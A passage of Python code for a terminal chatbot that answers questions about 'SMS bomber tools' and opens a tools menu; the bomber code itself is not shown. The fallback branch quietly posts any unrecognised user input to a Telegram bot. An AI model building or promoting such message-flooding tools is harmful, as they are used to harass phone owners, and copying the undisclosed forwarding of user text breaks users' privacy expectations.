        anim(f"{robo}{ran} Yes I Have Some Tools. Do you want to see Tools Menu?")
        # asis.say("Yes I Have SMS Bomber Tools. Do you want to see Tools Menu?")
        # asis.runAndWait()
        user_input_for_tools = input(str(f"\n{GRN}If You Want To See Menu Type\n \n{WHT}YES/NO {RED}=>{YLW}"))
        if "yes" in user_input_for_tools:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
        elif "Yes" in user_input_for_tools:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            menu()
        else:
            pass
    elif "Do you have SMS bomber tools?" in user:
        anim(f"{robo}{ran} Yes I Have Some Tools. Do you want to see Tools Menu?")
        # asis.say("Yes I Have SMS Bomber Tools. Do you want to see Tools Menu?")
        # asis.runAndWait()
        user_input_for_tools = input(str(f"\n{GRN}If You Want To See Menu Type\n \n{WHT}YES/NO {RED}=>{YLW}"))
        if "yes" in user_input_for_tools:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
        elif "Yes" in user_input_for_tools:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            menu()
        else:
            pass
    elif "Do you have sms bomber tools?" in user:
        anim(f"{robo}{ran} Yes I Have Some Tools. Do you want to see Tools Menu?")
        # asis.say("Yes I Have SMS Bomber Tools. Do you want to see Tools Menu?")
        # asis.runAndWait()
        user_input_for_tools = input(str(f"\n{GRN}If You Want To See Menu Type\n \n{WHT}YES/NO {RED}=>{YLW}"))
        if "yes" in user_input_for_tools:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
        elif "Yes" in user_input_for_tools:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            menu()
        else:
            pass
    elif "Do you have Bomber tools?" in user:
        anim(f"{robo}{ran} Yes I Have Some Tools. Do you want to see Tools Menu?")
        # asis.say("Yes I Have SMS Bomber Tools. Do you want to see Tools Menu?")
        # asis.runAndWait()
        user_input_for_tools = input(str(f"\n{GRN}If You Want To See Menu Type\n \n{WHT}YES/NO {RED}=>{YLW}"))
        if "yes" in user_input_for_tools:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
        elif "Yes" in user_input_for_tools:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            menu()
        else:
            pass
    elif "Do you have bomber tools?" in user:
        anim(f"{robo}{ran} Yes I Have Some Tools. Do you want to see Tools Menu?")
        # asis.say("Yes I Have SMS Bomber Tools. Do you want to see Tools Menu?")
        # asis.runAndWait()
        user_input_for_tools = input(str(f"\n{GRN}If You Want To See Menu Type\n \n{WHT}YES/NO {RED}=>{YLW}"))
        if "yes" in user_input_for_tools:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
        elif "Yes" in user_input_for_tools:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            menu()
        else:
            pass
    elif "Tools?" in user:
        anim(f"{robo}{ran} Yes I Have Some Tools. Do you want to see Tools Menu?")
        # asis.say("Yes I Have SMS Bomber Tools. Do you want to see Tools Menu?")
        # asis.runAndWait()
        user_input_for_tools = input(str(f"\n{GRN}If You Want To See Menu Type\n \n{WHT}YES/NO {RED}=>{YLW}"))
        if "yes" in user_input_for_tools:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
        elif "Yes" in user_input_for_tools:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            menu()
        else:
            pass
    elif "tools?" in user:
        anim(f"{robo}{ran} Yes I Have Some Tools. Do you want to see Tools Menu?")
        # asis.say("Yes I Have SMS Bomber Tools. Do you want to see Tools Menu?")
        # asis.runAndWait()
        user_input_for_tools = input(str(f"\n{GRN}If You Want To See Menu Type\n \n{WHT}YES/NO {RED}=>{YLW}"))
        if "yes" in user_input_for_tools:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
        elif "Yes" in user_input_for_tools:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            menu()
        else:
            pass
    elif "tools" in user:
        anim(f"{robo}{ran} Yes I Have Some Tools. Do you want to see Tools Menu?")
        # asis.say("Yes I Have SMS Bomber Tools. Do you want to see Tools Menu?")
        # asis.runAndWait()
        user_input_for_tools = input(str(f"\n{GRN}If You Want To See Menu Type\n \n{WHT}YES/NO {RED}=>{YLW}"))
        if "yes" in user_input_for_tools:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
        elif "Yes" in user_input_for_tools:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment, please. I'm running tools menu.")
            # asis.runAndWait()
            menu()
        else:
            pass
    elif "Tools" in user:
        anim(f"{robo}{ran} Yes I Have Some Tools. Do you want to see Tools Menu?")
        # asis.say("Yes I Have Some Tools. Do you want to see Tools Menu?")
        # asis.runAndWait()
        user_input_for_tools = input(str(f"\n{GRN}If You Want To See Menu Type\n \n{WHT}YES/NO {RED}=>{YLW}"))
        if "yes" in user_input_for_tools:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
        elif "Yes" in user_input_for_tools:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm runnings.")
            # asis.say("Sure! Just a moment, please. I'm runnings.")
            # asis.runAndWait()
            menu()
    elif "Menu" in user:
        anim(f"{robo}{ran} Yes I Have Some Tools. Do you want to see Tools Menu?")
        # asis.say("Yes I Have Some Tools. Do you want to see Tools Menu?")
        # asis.runAndWait()
        user_input_for_tools = input(str(f"\n{GRN}If You Want To See Menu Type\n \n{WHT}YES/NO {RED}=>{YLW}"))
        if "yes" in user_input_for_tools:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
        elif "Yes" in user_input_for_tools:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm runnings.")
            # asis.say("Sure! Just a moment, please. I'm runnings.")
            # asis.runAndWait()
            menu()
    elif "menu" in user:
        anim(f"{robo}{ran} Yes I Have Some Tools. Do you want to see Tools Menu?")
        # asis.say("Yes I Have Some Tools. Do you want to see Tools Menu?")
        # asis.runAndWait()
        user_input_for_tools = input(str(f"\n{GRN}If You Want To See Menu Type\n \n{WHT}YES/NO {RED}=>{YLW}"))
        if "yes" in user_input_for_tools:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
        elif "Yes" in user_input_for_tools:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm runnings.")
            # asis.say("Sure! Just a moment, please. I'm runnings.")
            # asis.runAndWait()
            menu()
    elif "Menu?" in user:
        anim(f"{robo}{ran} Yes I Have Some Tools. Do you want to see Tools Menu?")
        # asis.say("Yes I Have Some Tools. Do you want to see Tools Menu?")
        # asis.runAndWait()
        user_input_for_tools = input(str(f"\n{GRN}If You Want To See Menu Type\n \n{WHT}YES/NO {RED}=>{YLW}"))
        if "yes" in user_input_for_tools:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
        elif "Yes" in user_input_for_tools:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm runnings.")
            # asis.say("Sure! Just a moment, please. I'm runnings.")
            # asis.runAndWait()
            menu()
    elif "menu?" in user:
        anim(f"{robo}{ran} Yes I Have Some Tools. Do you want to see Tools Menu?")
        # asis.say("Yes I Have Some Tools. Do you want to see Tools Menu?")
        # asis.runAndWait()
        user_input_for_tools = input(str(f"\n{GRN}If You Want To See Menu Type\n \n{WHT}YES/NO {RED}=>{YLW}"))
        if "yes" in user_input_for_tools:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
        elif "Yes" in user_input_for_tools:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm runnings.")
            # asis.say("Sure! Just a moment, please. I'm runnings.")
            # asis.runAndWait()
            menu()
    elif "Menu!" in user:
        anim(f"{robo}{ran} Yes I Have Some Tools. Do you want to see Tools Menu?")
        # asis.say("Yes I Have Some Tools. Do you want to see Tools Menu?")
        # asis.runAndWait()
        user_input_for_tools = input(str(f"\n{GRN}If You Want To See Menu Type\n \n{WHT}YES/NO {RED}=>{YLW}"))
        if "yes" in user_input_for_tools:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
        elif "Yes" in user_input_for_tools:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm runnings.")
            # asis.say("Sure! Just a moment, please. I'm runnings.")
            # asis.runAndWait()
            menu()
    elif "menu!" in user:
        anim(f"{robo}{ran} Yes I Have Some Tools. Do you want to see Tools Menu?")
        # asis.say("Yes I Have Some Tools. Do you want to see Tools Menu?")
        # asis.runAndWait()
        user_input_for_tools = input(str(f"\n{GRN}If You Want To See Menu Type\n \n{WHT}YES/NO {RED}=>{YLW}"))
        if "yes" in user_input_for_tools:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
        elif "Yes" in user_input_for_tools:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm runnings.")
            # asis.say("Sure! Just a moment, please. I'm runnings.")
            # asis.runAndWait()
            menu()
    elif "Tools!" in user:
        anim(f"{robo}{ran} Yes I Have Some Tools. Do you want to see Tools Menu?")
        # asis.say("Yes I Have Some Tools. Do you want to see Tools Menu?")
        # asis.runAndWait()
        user_input_for_tools = input(str(f"\n{GRN}If You Want To See Menu Type\n \n{WHT}YES/NO {RED}=>{YLW}"))
        if "yes" in user_input_for_tools:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
        elif "Yes" in user_input_for_tools:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm runnings.")
            # asis.say("Sure! Just a moment, please. I'm runnings.")
            # asis.runAndWait()
            menu()
    elif "tools!" in user:
        anim(f"{robo}{ran} Yes I Have Some Tools. Do you want to see Tools Menu?")
        # asis.say("Yes I Have Some Tools. Do you want to see Tools Menu?")
        # asis.runAndWait()
        user_input_for_tools = input(str(f"\n{GRN}If You Want To See Menu Type\n \n{WHT}YES/NO {RED}=>{YLW}"))
        if "yes" in user_input_for_tools:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
        elif "Yes" in user_input_for_tools:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm runnings.")
            # asis.say("Sure! Just a moment, please. I'm runnings.")
            # asis.runAndWait()
            menu()
    elif "Tools?" in user:
        anim(f"{robo}{ran} Yes I Have Some Tools. Do you want to see Tools Menu?")
        # asis.say("Yes I Have Some Tools. Do you want to see Tools Menu?")
        # asis.runAndWait()
        user_input_for_tools = input(str(f"\n{GRN}If You Want To See Menu Type\n \n{WHT}YES/NO {RED}=>{YLW}"))
        if "yes" in user_input_for_tools:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm running tools menu.")
            # asis.say("Sure! Just a moment please. I'm running tools menu.")
            # asis.runAndWait()
            com("Clear")
            menu()
        elif "Yes" in user_input_for_tools:
            anim(f"{robo}{ran} Sure! Just a moment, please. I'm runnings.")
            # asis.say("Sure! Just a moment, please. I'm runnings.")
            # asis.runAndWait()
            menu()
    elif "exit" in user:
        sys.exit()
    elif "Quit" in user:
        sys.exit()
    elif "Stop" in user:
        sys.exit()
    elif "stop" in user:
        sys.exit()
    elif "quit" in user:
        sys.exit()
    elif "Exit" in user:
        sys.exit()
    else:
        anim(f"{ran}{user_name}: I have not been trained on this question. But I will learn about it very soon.")
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        payload = {
            'chat_id': chat_id,
            'text': user
        }

        response = requests.post(url, data=payload)
        if response.status_code == 200:
            print("Saved!")
        else:
            print("Due to some problem, I was unable to save your question. Please ask the question again.")

        # asis.say("I Don't Know About Your Question. Tell Me Someting Else!")
        # asis.runAndWait()
        # pywhatkit.search(user)
